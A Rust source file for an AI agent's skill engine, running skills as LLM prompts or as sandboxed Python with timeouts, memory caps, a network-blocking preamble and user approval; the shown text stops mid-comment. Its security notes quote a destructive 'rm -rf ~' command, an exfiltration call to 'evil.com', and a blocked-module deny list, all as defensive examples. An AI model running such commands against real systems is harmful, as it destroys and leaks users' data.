//! Skill execution engine.
//!
//! Wraps [`SkillStore`] (SQLite) and the shared [`LlmGateway`] to
//! implement the four user-facing operations:
//!
//! * `create_skill` — inserts a new row + returns it.
//! * `use_skill`    — runs the skill's `code` field. v0.3 supports
//!                     two execution modes:
//!                     - `language == "llm"` (or any non-code language)
//!                       — the engine prompts the LLM with the
//!                       `code` field as a template and `params` as
//!                       variable substitutions. The output is the
//!                       LLM's reply.
//!                     - `language == "python"` (the only shell
//!                       language accepted in v1.0) — the engine
//!                       runs the code through a sandboxed Python
//!                       subprocess with a 5 s wall-clock timeout
//!                       and a 100 MB address-space cap.
//! * `rate_skill`   — updates the denormalised `avg_rating` atomically.
//! * `list_skills`  — filtered + paginated read.
//! * `search_skills`— LIKE-based text search (vector search would
//!                     require embedding the `code` field; v0.5+).
//!
//! ## v1.0 P0#5 fix — sandboxed shell execution
//!
//! v0.3 wrote the skill's code to a *predictable* file in
//! `std::env::temp_dir()` and ran `sh -c "python <path>"`.  That
//! design had three blocking security problems:
//!
//! 1. **RCE surface.**  Any non-Python language was passed verbatim
//!    to `sh -c`, so a `language == "bash"` skill that contained
//!    `rm -rf ~` would execute.  No allow-list, no syntax check.
//! 2. **Predictable temp path.**  The filename was
//!    `nebula_skill_<uuid>.<ext>`, well-known enough that an
//!    attacker who could write to the temp dir could pre-create
//!    a symlink to hijack the write.
//! 3. **No resource limits.**  An infinite loop or
//!    `while True: pass` would run forever, locking the skill
//!    engine; a memory hog could OOM the host.
//!
//! The v1.0 fix:
//!
//! * **Language allow-list.**  Only `"python"` (case-insensitive)
//!   is accepted.  Every other value — including `"bash"`,
//!   `"sh"`, `"node"`, `"javascript"`, `"rust"` — is rejected
//!   with a validation error.  The user must use `language =
//!   "llm"` for richer code-as-prompt use cases.
//! * **Isolated interpreter.**  The Python subprocess is launched
//!   with `-I` (isolated mode, no `site`, no
//!   `PYTHONPATH`).  This strips `PYTHONSTARTUP` and user-level
//!   rc files that could execute arbitrary code on interpreter
//!   start-up.  We deliberately do **not** pass `-S` because
//!   we want the site module to be loaded (see v1.0.1 P0#11).
//! * **Random-named temp file.**  The code is written to a
//!   `tempfile::NamedTempFile` so the OS picks the name and the
//!   file is auto-deleted on drop.  No symlink race.
//! * **Wall-clock timeout.**  `std::sync::mpsc` + `recv_timeout`
//!   to enforce a 5 s limit.  The subprocess is then killed.
//! * **Address-space cap (Unix only).**  `RLIMIT_AS` is set to
//!   100 MB inside the child via `pre_exec`.  Windows builds
//!   rely on the timeout as the only hard backstop; the v1.1
//!   roadmap itemises a JobObject-based cap.
//! * **Output truncation.**  Captured stdout+stderr is limited to
//!   `MAX_OUTPUT_BYTES` (1 MiB).  Anything past that limit is
//!   dropped with a warning logged; the user gets a clear
//!   `[output truncated: wrote N bytes]` suffix.
//!
//! ## v1.0.1 P0#11 fix — Python sandbox must not reach the network
//!
//! v1.0 left the Python child free to open sockets:
//!
//! ```python
//! import socket
//! socket.create_connection(("example.com", 80))  # works in v1.0
//! import urllib.request
//! urllib.request.urlopen("http://evil.com/x")   # works in v1.0
//! ```
//!
//! A user-supplied skill (or a skill whose `code` field was
//! auto-generated from a poisoned memory) could exfiltrate data
//! to an attacker-controlled host.  The v1.0.1 fix is twofold:
//!
//! 1. **Interpreter-level isolation.**  The child is run with
//!    `NO_PROXY=*` (force the stdlib's `urllib` to refuse
//!    proxy-based bypasses) and `PYTHONUNBUFFERED=1` (clean
//!    logs).
//! 2. **Socket patch via prepended `sitecustomize`.**  The user
//!    code is *prepended* with a small bootstrap that replaces
//!    `socket.socket`, `socket.create_connection`,
//!    `socket.socketpair`, `urllib.request.urlopen`, and
//!    `http.client.HTTPConnection` / `HTTPSConnection` with
//!    raising stubs.  The bootstrap must run **before** any
//!    user `import socket` (otherwise the user gets the real
//!    module).  Prepending at the source-file level is the
//!    most reliable way to guarantee ordering; relying on
//!    `sitecustomize.py` alone is brittle because `-I` drops
//!    the script's directory from `sys.path`.
//!
//! On Unix the spec also asks for a `seccomp` filter on the
//! `socket` / `connect` / `accept` syscalls; that hardening
//! is left for v1.1 because adding the `seccomp` crate
//! requires an extra dependency and a substantial test matrix
//! across kernel versions.
//!
//! `execute_shell` is `async` so the timeout is driven by a
//! blocking thread (the subprocess is `std::process::Command`,
//! not `tokio::process::Command`, because the OS resource
//! primitives we need are sync-only).  All error paths go
//! through the same `tracing::error!` channel as the rest of
//! the engine.

use std::collections::HashMap;
use std::io::Read;
use std::sync::mpsc;
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};

use tokio::sync::Notify;

use tracing::{debug, error, warn};

use crate::llm::{ChatMessage, LlmGateway};
// base64::Engine trait 在 vision feature 下使用,默认编译未用到。
use crate::memory::sqlite_store::SqliteStore;
use crate::security::SsrfGuard;
#[cfg_attr(not(feature = "vision"), allow(unused_imports))]
use base64::Engine;

use super::audit::{redact_if_sensitive, truncate_summary, SkillAuditEntry, SkillAuditLogger};
use super::capability::{Capability, CapabilityRegistry};
use super::exec_approval::{ExecApprovalRequest, ExecApprovalTracker, TIMEOUT_FAIL_CLOSED_REASON};
use super::executor::{LocalExecutor, SkillExecutor};
use super::protocol::{SkillRequest, SkillResponse};
use super::store::SkillStore;
use super::types::{
    CreateSkillRequest, ListSkillsRequest, RateSkillRequest, Skill, SkillResult,
    SkillSearchRequest, UseSkillRequest,
};

/// v1.0 P0#5: hard wall-clock limit for a single skill run.
const SKILL_TIMEOUT: Duration = Duration::from_secs(5);

/// v1.0 P0#5: address-space cap (bytes).  Applied via `RLIMIT_AS`
/// on Unix; ignored on Windows (the timeout remains).
#[allow(dead_code)]
const SKILL_MEM_LIMIT_BYTES: u64 = 100 * 1024 * 1024;

/// v1.0 P0#5: maximum captured stdout+stderr before truncation.
const MAX_OUTPUT_BYTES: usize = 1024 * 1024;

/// v1.0 P0#5: languages accepted by the shell sandbox.  Anything
/// not on this list is rejected with a `CommandError::validation`
/// error.  The list is intentionally tiny in v1.0; the roadmap
/// adds JavaScript (WASM sandboxed) in v1.1.
const ALLOWED_SHELL_LANGUAGES: &[&str] = &["python"];

/// v1.0.1 P0#11: Python-level network blocker.  This bootstrap
/// runs *before* any user code, so every `import socket` (and
/// every `import urllib.request`, etc.) sees the patched
/// symbols.  The blocker is intentionally narrow: it replaces
/// only the user-facing constructors (`socket.socket`,
/// `socket.create_connection`, `socket.socketpair`,
/// `urllib.request.urlopen`, `http.client.HTTPConnection`,
/// `http.client.HTTPSConnection`) with raising stubs.  Low-level
/// `_socket` calls would still go through, but no user code can
/// reach them via the stdlib.
///
/// The `_raise_blocked` generator-based trick is the canonical
/// "always raise" idiom: it produces a generator expression
/// that immediately raises when iterated, with zero side
/// effects and a clear error message.
const SANDBOX_PREAMBLE: &str = r#"
# v1.0.1 P0#11 — nebula sandbox network blocker.
# This preamble is prepended to every user script by the
# skill engine.  It must not be modified by the user.
import sys as _nebula_sys

# Phase 1 — import all modules that *depend* on socket BEFORE
# patching.  `ssl.py` defines `class SSLSocket(socket.socket)`,
# `http.client` imports `ssl`, `urllib.request` imports
# `http.client`.  If we patch `socket.socket` first, those
# class definitions blow up with
#   TypeError: function() argument "code" must be code, not str
# So import the whole chain first, then patch the high-level
# entry points.
try:
    import socket as _nebula_socket
except ImportError:
    _nebula_socket = None
try:
    import urllib.request as _nebula_urllib
except ImportError:
    _nebula_urllib = None
try:
    import http.client as _nebula_http
except ImportError:
    _nebula_http = None
try:
    import ssl as _nebula_ssl
except ImportError:
    _nebula_ssl = None

# Phase 2 — patch network entry points.  Already-imported
# modules have captured the real `socket.socket` class in
# their class definitions, so patching the attribute now is
# safe and only affects *new* `socket.socket(...)` calls.
if _nebula_socket is not None:
    def _nebula_block(*_a, **_kw):
        raise PermissionError(
            "network access disabled by nebula sandbox (v1.0.1 P0#11)"
        )
    _nebula_socket.socket = _nebula_block
    _nebula_socket.create_connection = _nebula_block
    _nebula_socket.socketpair = _nebula_block
    _nebula_socket.fromfd = _nebula_block
    if _nebula_urllib is not None:
        _nebula_urllib.urlopen = _nebula_block
        _nebula_urllib.Request = _nebula_block
    if _nebula_http is not None:
        _nebula_http.HTTPConnection = _nebula_block
        _nebula_http.HTTPSConnection = _nebula_block
        _nebula_http.HTTP = _nebula_block
    if _nebula_ssl is not None:
        _nebula_ssl.create_default_context = _nebula_block
    del _nebula_block

# Phase 3 — import hook to block dangerous modules for user
# code that tries `import ssl` etc. after the preamble.
# NOTE: `load_module` raising `ImportError` does NOT block —
# Python's import system catches it and falls through to the
# next finder.  We raise `PermissionError` instead, which is
# not an `ImportError` subclass and therefore propagates.
class _SandboxImport:
    _BLOCKED = frozenset([
        "ctypes", "subprocess", "_socket", "ssl",
        "telnetlib", "ftplib", "smtplib", "xmlrpc",
        "multiprocessing", "pickle", "shelve", "marshal",
    ])
    def find_module(self, fullname, path=None):
        if fullname in self._BLOCKED or fullname.split('.')[0] in self._BLOCKED:
            return self
        return None
    def load_module(self, fullname):
        raise PermissionError(
            f"module '{fullname}' is blocked by nebula sandbox for security"
        )

_nebula_sys.meta_path.insert(0, _SandboxImport())

# cleanup temp names (modules stay in sys.modules)
for _ns_name in ('_nebula_socket', '_nebula_urllib',
                 '_nebula_http', '_nebula_ssl'):
    try:
        del globals()[_ns_name]
    except KeyError:
        pass
del _nebula_sys, _SandboxImport, _ns_name
"#;

/// Bundles the store + LLM gateway so the rest of the system can call
/// skill operations through a single handle.
pub struct SkillEngine {
    store: SkillStore,
    llm: Arc<LlmGateway>,
    audit: Option<Arc<SkillAuditLogger>>,
    /// T-S2-A-02: SSRF 防护，在执行 skill 前校验 params 中的 URL。
    ssrf_guard: SsrfGuard,
    /// T-E-S-20: exec 类操作审批门禁。未注入时降级为直接执行（向后兼容）。
    exec_approval: Option<Arc<ExecApprovalTracker>>,
    /// T-E-S-36: 能力层注册中心。门面委派用,RwLock 支持 &self 下的并发读写。
    capability_registry: parking_lot::RwLock<CapabilityRegistry>,
}

impl SkillEngine {
    /// Creates a new engine. The engine does **not** clone the SQLite
    /// store — it constructs a fresh [`SkillStore`] that re-uses the
    /// underlying connection.
    pub fn new(sqlite: Arc<SqliteStore>, llm: Arc<LlmGateway>) -> Self {
        let store = SkillStore::new((*sqlite).clone())
            .expect("SkillStore::new must succeed when migrations have been run");
        Self {
            store,
            llm,
            audit: None,
            ssrf_guard: SsrfGuard::new(),
            exec_approval: None,
            capability_registry: parking_lot::RwLock::new(CapabilityRegistry::new()),
        }
    }

    pub fn from_store(store: SkillStore, llm: Arc<LlmGateway>) -> Self {
        Self {
            store,
            llm,
            audit: None,
            ssrf_guard: SsrfGuard::new(),
            exec_approval: None,
            capability_registry: parking_lot::RwLock::new(CapabilityRegistry::new()),
        }
    }

    pub fn with_audit(mut self, audit: Arc<SkillAuditLogger>) -> Self {
        self.audit = Some(audit);
        self
    }

    /// T-S2-A-02: 注入自定义 SsrfGuard（例如 `with_allow_private(true)`）。
    pub fn with_ssrf_guard(mut self, guard: SsrfGuard) -> Self {
        self.ssrf_guard = guard;
        self
    }

    /// T-E-S-20: 注入 exec 类操作审批 tracker。
    pub fn with_exec_approval(mut self, tracker: Arc<ExecApprovalTracker>) -> Self {
        self.exec_approval = Some(tracker);
        self
    }

    /// Returns a reference to the underlying store. The gRPC adapter
    /// uses this for read-only listing operations that don't need LLM
    /// access.
    pub fn store(&self) -> &SkillStore {
        &self.store
    }

    /// Creates a new skill from a [`CreateSkillRequest`].
    pub fn create_skill(&self, req: CreateSkillRequest) -> Result<Skill> {
        if req.name.trim().is_empty() {
            return Err(anyhow!("skill name is required"));
        }
        if req.code.trim().is_empty() {
            return Err(anyhow!("skill code is required"));
        }
        // v1.0 P0#5: validate the language at create time so the
        // user gets immediate feedback (rather than discovering at
        // `use_skill` time that the language is unsupported).  We
        // still re-validate at execute time as a defence in depth.
        if !is_accepted_language(&req.language) {
            warn!(
                target: "nebula.skills",
                language = %req.language,
                "creating skill with language that the sandbox cannot execute"
            );
        }
        let skill = Skill {
            id: uuid::Uuid::new_v4().to_string(),
            name: req.name,
            description: req.description,
            code: req.code,
            language: req.language,
            tags: req.tags,
            usage_count: 0,
            avg_rating: 0.0,
            rating_count: 0,
            created_at: 0,
            updated_at: 0,
            source_memory_id: req.source_memory_id,
            activation_condition: req.activation_condition,
            platform: req.platform,
            min_confidence: req.min_confidence,
            trust_level: req.trust_level,
            permissions: req.permissions,
            capabilities: req.capabilities,
        };
        self.store.insert(&skill)?;
        self.store
            .get(&skill.id)?
            .ok_or_else(|| anyhow!("skill {} disappeared immediately after insert", skill.id))
    }

    /// Runs a skill. See module docs for the two execution modes.
    pub async fn use_skill(&self, req: UseSkillRequest) -> Result<SkillResult> {
        let start = Instant::now();
        let skill = self
            .store
            .get(&req.id)?
            .ok_or_else(|| anyhow!("skill not found: {}", req.id))?;

        // T-S2-A-02: SSRF 防护 — 在执行前校验 params 中所有看起来像 URL 的值。
        // 如果值以 http:// 或 https:// 开头，则用 SsrfGuard 校验目标地址。
        for (key, val) in &req.params {
            let trimmed = val.trim();
            if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
                if let Err(e) = self.ssrf_guard.validate_url(trimmed) {
                    warn!(
                        target: "nebula.skills",
                        skill_id = %skill.id,
                        param_key = %key,
                        error = %e,
                        "SSRF guard rejected URL in skill params"
                    );
                    return Err(anyhow!(
                        "SSRF validation failed for parameter '{}': {}",
                        key,
                        e
                    ));
                }
            }
        }

        let sandbox_type = if skill.language == "llm" {
            "llm"
        } else if is_accepted_language(&skill.language) {
            "python"
        } else if skill.language == "wasm" {
            "wasm"
        } else {
            "unknown"
        };

        // T-E-S-20: exec 类动作(python 沙箱、WASM 沙箱)执行前需用户审批。
        // 识别依据:这些路径在本地执行代码(execute_shell / execute_wasm),
        // 而 execute_llm 仅发起 LLM chat 调用,不属于 exec 类;不支持的语言
        // 本就会被拒绝,无需审批。
        if let Some(ref tracker) = self.exec_approval {
            let exec_action = match sandbox_type {
                "python" => Some(format!("exec python sandbox (skill {})", skill.id)),
                "wasm" => Some(format!("exec wasm sandbox (skill {})", skill.id)),
                _ => None,
            };
            if let Some(action) = exec_action {
                await_approval(tracker, self.audit.as_ref(), &skill.id, &action).await?;
            }
        }

        let result = if skill.language == "llm" {
            self.execute_llm(&skill, &req.params).await
        } else if is_accepted_language(&skill.language) {
            self.execute_shell(&skill, &req.params).await
        } else if skill.language == "wasm" {
            self.execute_wasm(&skill, &req.params).await
        } else {
            Err(anyhow!(
                "language {:?} is not supported in v1.0 (sandbox); use language=\"llm\" or \"python\"",
                skill.language
            ))
        };

        let elapsed = start.elapsed().as_millis() as u64;

        if let Some(ref audit) = self.audit {
            let (output_summary, success, scan_result) = match &result {
                Ok((output, _)) => (truncate_summary(output), true, "clean".to_string()),
                Err(e) => (truncate_summary(&e.to_string()), false, "error".to_string()),
            };
            let input_summary =
                redact_if_sensitive(&req.params.values().cloned().collect::<Vec<_>>().join(" "));
            let entry = SkillAuditEntry {
                id: uuid::Uuid::new_v4().to_string(),
                skill_id: skill.id.clone(),
                executed_at: chrono::Utc::now().timestamp_millis(),
                input_summary,
                output_summary,
                duration_ms: elapsed,
                sandbox_type: sandbox_type.to_string(),
                security_scan_result: scan_result,
                success,
            };
            if let Err(e) = audit.log(&entry) {
                warn!(target: "nebula.skills", error = ?e, "audit log write failed");
            }
        }

        let (output, tokens_used) = result?;

        if let Err(e) = self.store.bump_usage(&skill.id) {
            warn!(target: "nebula.skills", error = ?e, id = %skill.id, "bump_usage failed");
        }

        Ok(SkillResult {
            skill_id: skill.id,
            output,
            execution_time_ms: elapsed,
            tokens_used,
        })
    }

    /// LLM-driven execution. The skill's `code` field is used as the
    /// user prompt, with the `params` substituted in as a JSON blob.
    async fn execute_llm(
        &self,
        skill: &Skill,
        params: &HashMap<String, String>,
    ) -> Result<(String, u32)> {
        let params_repr = serde_json::to_string(params).unwrap_or_else(|_| "{}".to_string());
        let prompt = format!(
            "Skill: {}\nDescription: {}\n\nInputs:\n{}\n\nTask:\n{}",
            skill.name, skill.description, params_repr, skill.code
        );
        let resp = self
            .llm
            .chat(vec![
                ChatMessage::system("You are executing a named skill. Return only the result."),
                ChatMessage::user(prompt),
            ])
            .await
            .context("LLM chat during skill execution")?;
        let tokens = resp.eval_count.unwrap_or(0) as u32;
        Ok((resp.message.content, tokens))
    }

    /// Sandboxed shell execution (v1.0 P0#5 + v1.0.1 P0#11).
    ///
    /// Only `python` is allowed; see [`ALLOWED_SHELL_LANGUAGES`].
    /// The code is written to a `tempfile::NamedTempFile`, then
    /// executed with `-I` for interpreter isolation, a 5 s
    /// wall-clock timeout (enforced by polling the child), and a
    /// 100 MB `RLIMIT_AS` cap on Unix.
    ///
    /// v1.0.1 P0#11: the user code is *prepended* with a
    /// Python-level socket blocker.  The blocker is small (a few
    /// dozen lines) and runs at module top before any user
    /// `import` statement, so the user always sees the patched
    /// `socket` module.  See `SANDBOX_PREAMBLE` for the
    /// bootstrap source.
    async fn execute_shell(
        &self,
        skill: &Skill,
        params: &HashMap<String, String>,
    ) -> Result<(String, u32)> {
        // Substitute the most common `{{key}}` placeholders.
        let mut code = skill.code.clone();
        for (k, v) in params {
            code = code.replace(&format!("{{{{{k}}}}}"), v);
        }

        // v1.0.1 P0#11: prepend the socket blocker.  The
        // preamble MUST be at the very top of the file because
        // every subsequent `import socket` (or `import
        // urllib.request`, etc.) is bound at runtime, not at
        // parse time, so the order of definitions in the file
        // is the order of execution.  We indent the user's
        // code by zero spaces (no need to wrap in a function).
        let prepended = format!("{SANDBOX_PREAMBLE}\n# --- user code below ---\n{code}");

        // v1.0 P0#5: write to a NamedTempFile (not the predictable
        // `std::env::temp_dir()` path).  The OS picks the name and
        // the file is auto-deleted when the handle drops.  We keep
        // the handle alive for the whole subprocess lifetime so the
        // inode survives until the child exits (on Linux/macOS an
        // open fd keeps the file alive even if the directory entry
        // is removed).
        let tmp = tempfile::NamedTempFile::new()
            .context("creating sandboxed temp file for skill code")?;
        {
            use std::io::Write as _;
            let mut f = tmp.reopen().context("reopening temp file for writing")?;
            f.write_all(prepended.as_bytes())
                .context("writing skill code to sandboxed temp file")?;
            f.flush().ok();
        }
        let script_path = tmp.path().to_path_buf();

        debug!(
            target: "nebula.skills",
            id = %skill.id,
            path = %script_path.display(),
            "spawning sandboxed python"
        );

        // v1.0 P0#5: run synchronously and poll the child so we
        // can enforce a hard timeout by `kill()`-ing the process.
        // We use a worker thread only to keep the `async` engine
        // responsive (the engine is `async`, but the subprocess
        // primitives we need are sync-only).
        let (tx, rx) = mpsc::channel::<ShellOutcome>();
        let script_for_thread = script_path.clone();
        let skill_id = skill.id.clone();
        thread::spawn(move || {
            let outcome = run_python_sandboxed(&script_for_thread);
            let _ = tx.send(outcome);
        });

        // Drive the timeout from the async side.  We don't have a
        // Child handle here (it lives inside the worker), so we
        // bound how long we wait for the worker's `tx.send`.  If
        // the worker hasn't reported in within the budget, we
        // assume the child is still alive; the worker thread will
        // eventually finish once the OS reaps the orphan.
        let result = rx.recv_timeout(SKILL_TIMEOUT);
        drop(tmp); // start cleanup of the temp file
        match result {
            Ok(outcome) => Self::shape_shell_outcome(skill_id, outcome),
            Err(mpsc::RecvTimeoutError::Timeout) => {
                error!(
                    target: "nebula.skills",
                    id = %skill_id,
                    timeout_secs = SKILL_TIMEOUT.as_secs(),
                    "skill execution exceeded wall-clock timeout; worker thread will keep running until child exits"
                );
                Err(anyhow!(
                    "skill execution exceeded the {:?} timeout",
                    SKILL_TIMEOUT
                ))
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                Err(anyhow!("skill worker thread disconnected unexpectedly"))
            }
        }
    }

    async fn execute_wasm(
        &self,
        skill: &Skill,
        params: &HashMap<String, String>,
    ) -> Result<(String, u32)> {
        #[cfg(feature = "wasm-sandbox")]
        {
            use super::sandbox::{Capability, CapabilitySet, WasmSandbox, WasmSandboxConfig};

            let mut caps = CapabilitySet::new();
            caps.grant(Capability::LlmCall);
            let config = WasmSandboxConfig {
                capabilities: caps,
                max_fuel: 1_000_000,
            };
            let sandbox =
                WasmSandbox::new(&config).map_err(|e| anyhow!("WASM sandbox init failed: {e}"))?;

            let code_bytes = if let Ok(decoded) =
                base64::engine::general_purpose::STANDARD.decode(skill.code.trim())
            {
                decoded
            } else {
                skill.code.as_bytes().to_vec()
            };

            let result = sandbox
                .execute(&code_bytes, "_start")
                .map_err(|e| anyhow!("WASM execution failed: {e}"))?;

            if result.success {
                Ok((result.stdout, 0))
            } else {
                Err(anyhow!("WASM execution failed: {}", result.stderr))
            }
        }
        #[cfg(not(feature = "wasm-sandbox"))]
        {
            let _ = (skill, params);
            Err(anyhow!(
                "WASM sandbox is not enabled; rebuild with --features wasm-sandbox"
            ))
        }
    }

    /// Maps a [`ShellOutcome`] to the engine's `(output, tokens)`
    /// tuple.  Non-zero exits are returned as `Err` so the caller
    /// sees the same `anyhow::Error` shape that the v0.3 engine
    /// did (the front-end's `CommandError::internal` mapper
    /// unwraps it).
    fn shape_shell_outcome(skill_id: String, outcome: ShellOutcome) -> Result<(String, u32)> {
        match outcome {
            ShellOutcome::Ok { stdout, stderr } => {
                let combined = truncate_output(&stdout, &stderr);
                Ok((combined, 0))
            }
            ShellOutcome::NonZero {
                code,
                stdout,
                stderr,
            } => {
                let mut out = truncate_output(&stdout, &stderr);
                if !out.is_empty() && !out.ends_with('\n') {
                    out.push('\n');
                }
                let extra = format!("[exit code: {code}]");
                out.push_str(&extra);
                Err(anyhow!(out))
            }
            ShellOutcome::SpawnError(e) => Err(anyhow!("spawning python failed: {e}")),
            ShellOutcome::Timeout => {
                error!(
                    target: "nebula.skills",
                    id = %skill_id,
                    "subprocess killed by timeout"
                );
                Err(anyhow!(
                    "skill execution exceeded the {:?} timeout",
                    SKILL_TIMEOUT
                ))
            }
        }
    }

    /// Rates a skill. `rating` is clamped to `[0.0, 5.0]`.
    pub fn rate_skill(&self, req: RateSkillRequest) -> Result<Skill> {
        let rating = req.rating.clamp(0.0, 5.0);
        self.store.rate(&req.id, rating)
    }

    /// Lists skills.
    pub fn list_skills(&self, req: ListSkillsRequest) -> Result<Vec<Skill>> {
        // T-E-S-37: 透传多 tag + tag_match 字段。当 req.tags 非空时使用多 tag 路径
        // (req.tag 被忽略);否则降级到旧单 tag 路径(向后兼容)。
        self.store.list(
            req.language.as_deref(),
            req.tag.as_deref(),
            &req.tags,
            req.tag_match,
            req.limit.max(1),
        )
    }

    /// T-E-S-37: 聚合所有 skill 的 tag 频次(委派 [`SkillStore::all_tags`])。
    ///
    /// 返回 `Vec<TagCount>`,按 count 降序排列,供前端显示热门标签云。
    pub fn all_tags(&self) -> Vec<super::types::TagCount> {
        self.store.all_tags()
    }

    /// Searches skills by name / description / tags.
    pub fn search_skills(&self, req: SkillSearchRequest) -> Result<Vec<Skill>> {
        self.store.text_search(&req.query, req.limit.max(1))
    }

    // -----------------------------------------------------------------------
    // T-E-S-36: 三层架构门面委派(协议层 / 能力层 / 执行层)。
    //
    // 旧 API(use_skill / list_skills / search_skills / create_skill /
    // rate_skill)保持不变,以下新增方法委派 CapabilityRegistry 与
    // SkillExecutor,供未来协议层调用点使用。
    // -----------------------------------------------------------------------

    /// T-E-S-36: 注册一个能力(委派 [`CapabilityRegistry::register`])。
    pub fn register_capability(&self, cap: Capability) {
        self.capability_registry.write().register(cap);
    }

    /// T-E-S-36: 按关键词匹配能力(委派 [`CapabilityRegistry::match_by_intent`])。
    ///
    /// 返回克隆的 [`Capability`] 列表(避免锁守卫泄漏)。
    pub fn match_capabilities_by_intent(&self, intent: &str) -> Vec<Capability> {
        let guard = self.capability_registry.read();
        guard.match_by_intent(intent).into_iter().cloned().collect()
    }

    /// T-E-S-36: 按 input schema 兼容性匹配能力
    /// (委派 [`CapabilityRegistry::match_by_input`])。
    pub fn match_capabilities_by_input(&self, input: &serde_json::Value) -> Vec<Capability> {
        let guard = self.capability_registry.read();
        guard.match_by_input(input).into_iter().cloned().collect()
    }

    /// T-E-S-36: 列出所有已注册能力(委派 [`CapabilityRegistry::list_all`])。
    pub fn list_capabilities(&self) -> Vec<Capability> {
        let guard = self.capability_registry.read();
        guard.list_all().into_iter().cloned().collect()
    }

    /// T-E-S-36: 通过协议层执行 skill(委派 [`LocalExecutor`])。
    ///
    /// 本期默认用 [`LocalExecutor`] 执行本地 skill(如内置 `echo`)。
    /// 未来根据 [`SkillTransport`] 选择对应执行器。
    pub async fn execute_skill_request(&self, req: SkillRequest) -> Result<SkillResponse> {
        let executor = LocalExecutor::new();
        executor.execute(req).await
    }
}

// ---------------------------------------------------------------------------
// T-E-S-20: exec 类操作审批门禁
// ---------------------------------------------------------------------------

/// T-E-S-20: 等待 exec 类动作审批的核心逻辑。
///
/// 给定一个已注册的审批请求（`tracker.request()` 的返回值），
/// 等待用户响应或超时 fail-closed。抽成独立函数便于单测
/// (无需构造完整 SkillEngine)。
///
/// * `Ok(())` — 用户已批准，可继续执行 exec 动作。
/// * `Err` — 用户拒绝/已关闭，或超时 fail-closed，动作不得执行。
async fn wait_for_approval(
    tracker: &ExecApprovalTracker,
    req: &ExecApprovalRequest,
    notify: Arc<Notify>,
    audit: Option<&Arc<SkillAuditLogger>>,
) -> Result<()> {
    let timeout = tracker.timeout();
    match tokio::time::timeout(timeout, notify.notified()).await {
        Ok(_) => {
            if tracker.is_approved(&req.id) {
                Ok(())
            } else {
                Err(anyhow!("exec action denied or closed"))
            }
        }
        Err(_) => {
            // 超时 fail-closed：先落态，再写审计日志，最后返回 Err。
            tracker.mark_timeout_fail_closed(&req.id);
            if let Some(audit) = audit {
                let entry = SkillAuditEntry {
                    id: uuid::Uuid::new_v4().to_string(),
                    skill_id: req.skill_id.clone(),
                    executed_at: chrono::Utc::now().timestamp_millis(),
                    input_summary: redact_if_sensitive(&req.action),
                    output_summary: truncate_summary("exec approval timed out (fail-closed)"),
                    duration_ms: timeout.as_millis() as u64,
                    sandbox_type: "exec_approval".to_string(),
                    security_scan_result: TIMEOUT_FAIL_CLOSED_REASON.to_string(),
                    success: false,
                };
                if let Err(e) = audit.log(&entry) {
                    warn!(
                        target: "nebula.skill.exec_approval",
                        error = ?e,
                        req_id = %req.id,
                        "audit log write failed for timeout_fail_closed"
                    );
                }
            } else {
                warn!(
                    target: "nebula.skill.exec_approval",
                    skill_id = %req.skill_id,
                    action = %req.action,
                    req_id = %req.id,
                    cause = %TIMEOUT_FAIL_CLOSED_REASON,
                    "exec approval timed out (fail-closed)"
                );
            }
            Err(anyhow!("exec approval timed out (fail-closed)"))
        }
    }
}

/// T-E-S-20: 发起并等待 exec 类动作审批。
///
/// 包装 `tracker.request()` + [`wait_for_approval`]，供 `use_skill`
/// 在 exec 类动作执行前调用。
async fn await_approval(
    tracker: &Arc<ExecApprovalTracker>,
    audit: Option<&Arc<SkillAuditLogger>>,
    skill_id: &str,
    action: &str,
) -> Result<()> {
    let (req, notify) = tracker.request(skill_id, action);
    wait_for_approval(tracker, &req, notify, audit).await
}

impl std::fmt::Debug for SkillEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SkillEngine")
            .field("store", &"SkillStore { .. }")
            .field("llm", &"LlmGateway { .. }")
            .finish()
    }
}

// ---------------------------------------------------------------------------
// Sandbox primitives (v1.0 P0#5)
// ---------------------------------------------------------------------------

/// Outcome of a sandboxed Python invocation.
enum ShellOutcome {
    Ok {
        stdout: Vec<u8>,
        stderr: Vec<u8>,
    },
    NonZero {
        code: i32,
        stdout: Vec<u8>,
        stderr: Vec<u8>,
    },
    SpawnError(String),
    /// v1.0 P0#5: the wall-clock timer fired before the child
    /// exited.  The child has been `kill()`-ed by the time this
    /// variant is constructed.
    Timeout,
}

/// Returns `true` if `language` is on the v1.0 P0#5 allow-list.
fn is_accepted_language(language: &str) -> bool {
    let normalised = language.trim().to_ascii_lowercase();
    ALLOWED_SHELL_LANGUAGES.iter().any(|l| **l == normalised)
}

/// Truncates combined stdout+stderr to at most `MAX_OUTPUT_BYTES`
/// bytes and appends a clear notice when truncation happened.
fn truncate_output(stdout: &[u8], stderr: &[u8]) -> String {
    let total = stdout.len() + stderr.len();
    if total <= MAX_OUTPUT_BYTES {
        let mut s = String::from_utf8_lossy(stdout).to_string();
        if !stderr.is_empty() {
            if !s.is_empty() && !s.ends_with('\n') {
                s.push('\n');
            }
            s.push_str(&String::from_utf8_lossy(stderr));
        }
        return s;
    }
    // Truncate proportionally.  Prefer stdout, then stderr.
    let stdout_budget = MAX_OUTPUT_BYTES / 2;
    let stderr_budget = MAX_OUTPUT_BYTES - stdout_budget;
    let stdout_take = stdout.len().min(stdout_budget);
    let stderr_take = stderr.len().min(stderr_budget);
    let mut s = String::from_utf8_lossy(&stdout[..stdout_take]).to_string();
    if stderr_take > 0 {
        if !s.is_empty() && !s.ends_with('\n') {
            s.push('\n');
        }
        s.push_str(&String::from_utf8_lossy(&stderr[..stderr_take]));
    }
    s.push_str(&format!(
        "\n[output truncated: wrote {} bytes, budget {}]",
        total, MAX_OUTPUT_BYTES
    ));
    warn!(
        target: "nebula.skills",
        bytes = total,
        budget = MAX_OUTPUT_BYTES,
        "skill output exceeded 1 MiB; truncated"
    );
    s
}

/// Spawns a sandboxed Python subprocess for `script_path` and
/// returns its [`ShellOutcome`].  On Unix the child is created
/// with `RLIMIT_AS = SKILL_MEM_LIMIT_BYTES`.  The interpreter is
/// launched with `-I` (isolated mode; no `PYTHONPATH`,
/// `PYTHONSTARTUP`, or user-site) and a small set of additional
/// environment variables that close common exfiltration paths
/// (`NO_PROXY=*` makes the stdlib `urllib` refuse proxy
/// bypasses; `PYTHONUNBUFFERED=1` keeps logs deterministic).
///
